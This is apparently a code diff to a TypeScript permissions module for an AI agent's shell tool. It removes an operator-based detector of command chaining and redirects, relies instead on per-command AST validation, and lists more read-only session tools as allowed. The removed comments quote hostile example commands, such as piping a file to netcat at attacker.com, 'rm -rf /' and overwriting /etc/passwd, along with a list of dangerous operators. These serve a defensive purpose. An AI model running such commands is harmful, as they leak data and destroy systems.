@@ -13,7 +13,6 @@
 /// <reference path="../types/incr-regex-package.d.ts" />
 
 import { homedir } from 'os';
-import { parse as parseShellCommand, type ParseEntry } from 'shell-quote';
 import { debug } from '../utils/debug.ts';
 import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
 import {
@@ -318,102 +317,20 @@ export function cleanupModeState(sessionId: string): void {
  */
 type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;
 
-// ============================================================
-// Command Chaining Detection (Security)
-// ============================================================
-
 /**
- * Operators that chain multiple commands together.
- * These are dangerous because they allow executing arbitrary commands
- * after a "safe" prefix like: `ls && rm -rf /`
- */
-export const DANGEROUS_CHAIN_OPERATORS = new Set([
-  '&&',   // AND - second command runs if first succeeds
-  '||',   // OR - second command runs if first fails
-  ';',    // Sequence - always runs second command
-  '|',    // Pipe - connects stdout to stdin (can chain to dangerous commands)
-  '&',    // Background - runs command in background
-  '|&',   // Pipe stderr - bash extension
-]);
-
-/**
- * Operators that write to files.
- * These are dangerous because they can overwrite/modify files.
- */
-export const DANGEROUS_REDIRECT_OPERATORS = new Set([
-  '>',    // Overwrite file
-  '>>',   // Append to file
-  '>&',   // Redirect stderr to file
-]);
-
-/**
- * Extract the operator string from a shell-quote operator token.
- * shell-quote returns operators as objects with an `op` property.
- * Returns undefined if not an operator.
- */
-function getOperator(token: ParseEntry): string | undefined {
-  if (typeof token === 'object' && token !== null && 'op' in token) {
-    return token.op;
-  }
-  return undefined;
-}
-
-/**
- * Check if a command contains dangerous shell operators (command chaining or redirects).
+ * Dangerous control characters that could cause issues at lower levels.
  *
- * This prevents attacks like:
- * - `ls && rm -rf /` (command chaining)
- * - `cat file | nc attacker.com 1234` (piping to network)
- * - `echo "data" > /etc/passwd` (file overwrite)
- *
- * Uses shell-quote to properly parse the command, handling edge cases like:
- * - Quoted strings: `ls "&&"` is safe (the && is a literal string)
- * - Escaped chars: `ls \&\&` is safe (escaped)
- *
- * @param command - The bash command to check
- * @returns true if command contains dangerous operators, false if safe
- */
-export function hasDangerousShellOperators(command: string): boolean {
-  try {
-    const parsed = parseShellCommand(command);
-
-    for (const token of parsed) {
-      const op = getOperator(token);
-      if (op) {
-        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
-          debug(`[Mode] Dangerous chain operator detected: "${op}" in command: ${command}`);
-          return true;
-        }
-        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
-          debug(`[Mode] Dangerous redirect operator detected: "${op}" in command: ${command}`);
-          return true;
-        }
-      }
-    }
-
-    return false;
-  } catch (error) {
-    // Parse error - assume dangerous (fail closed)
-    debug(`[Mode] Shell parse error for command "${command}":`, error);
-    return true;
-  }
-}
-
-/**
- * Control characters that act as command separators or could be used for injection.
- * These are dangerous because they can terminate the "safe" command and start a new one.
+ * Note: Newlines and carriage returns are NOT blocked because bash-parser
+ * correctly handles them as command separators, and the AST validation
+ * checks each command individually. Only null bytes are blocked as they
+ * could cause issues with C bindings and string handling.
  */
 const DANGEROUS_CONTROL_CHARS = new Set([
-  '\n',    // Newline - acts as command separator in bash
-  '\r',    // Carriage return - can act as newline
   '\x00',  // Null byte - can truncate strings in some contexts
 ]);
 
 /**
  * Check if a command contains dangerous control characters.
- *
- * Newlines and carriage returns act as command separators in bash:
- * - `ls\nrm -rf /` executes both ls and rm
  *
  * @param command - The bash command to check
  * @returns true if command contains dangerous control chars, false if safe
@@ -526,23 +443,6 @@ export type BashRejectionReason =
   | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };
 
 /**
- * Human-readable explanations for dangerous operators.
- * These help the agent understand why specific operators are blocked.
- */
-const OPERATOR_EXPLANATIONS: Record<string, string> = {
-  // Note: &&, ||, and | are now validated per-command via AST, not blocked outright.
-  // These explanations are kept for legacy error messages but should rarely be hit.
-  '&&': 'runs second command if first succeeds (e.g., `safe && dangerous`)',
-  '||': 'runs second command if first fails (e.g., `safe || dangerous`)',
-  ';': 'always runs second command regardless of first (e.g., `safe; dangerous`)',
-  '&': 'runs command in background, allowing additional commands',
-  // Redirect operators
-  '>': 'overwrites file contents (e.g., `echo data > /etc/passwd`)',
-  '>>': 'appends to file (e.g., `echo data >> ~/.bashrc`)',
-  '>&': 'redirects stderr to a file',
-};
-
-/**
  * Human-readable explanations for control characters.
  */
 const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
@@ -565,40 +465,6 @@ function findDangerousControlChar(command: string): { char: string; charCode: nu
     }
   }
   return null;
-}
-
-/**
- * Find the first dangerous shell operator in a command.
- * Returns details about the operator if found, null otherwise.
- */
-function findDangerousOperator(command: string): { operator: string; operatorType: 'chain' | 'redirect'; explanation: string } | null {
-  try {
-    const parsed = parseShellCommand(command);
-
-    for (const token of parsed) {
-      const op = getOperator(token);
-      if (op) {
-        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
-          return {
-            operator: op,
-            operatorType: 'chain',
-            explanation: OPERATOR_EXPLANATIONS[op] ?? 'allows command chaining',
-          };
-        }
-        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
-          return {
-            operator: op,
-            operatorType: 'redirect',
-            explanation: OPERATOR_EXPLANATIONS[op] ?? 'allows file redirection',
-          };
-        }
-      }
-    }
-    return null;
-  } catch {
-    // Parse error handled separately
-    return null;
-  }
 }
 
 /**
@@ -1353,17 +1219,21 @@ export function shouldAllowToolInMode(
 
     // Handle session-scoped tools - allow read-only, block mutations
     if (toolName.startsWith('mcp__session__')) {
-      // Read-only session tools - always allowed
+      // Read-only session tools - always allowed in Explore mode
+      // These tools don't modify state, they only read/validate/invoke secondary models
       const readOnlySessionTools = [
         'mcp__session__SubmitPlan',
         'mcp__session__config_validate',
+        'mcp__session__skill_validate',
+        'mcp__session__mermaid_validate',
         'mcp__session__source_test',
+        'mcp__session__call_llm', // Invokes secondary Claude model - no side effects
       ];
       if (readOnlySessionTools.includes(toolName)) {
         return { allowed: true };
       }
 
-      // Write session tools - blocked in safe mode
+      // Write/auth session tools - blocked in Explore mode (source_oauth_trigger, source_credential_prompt, etc.)
       return {
         allowed: false,
         reason: `Session configuration changes are blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to create, update, or delete sources and agents.`
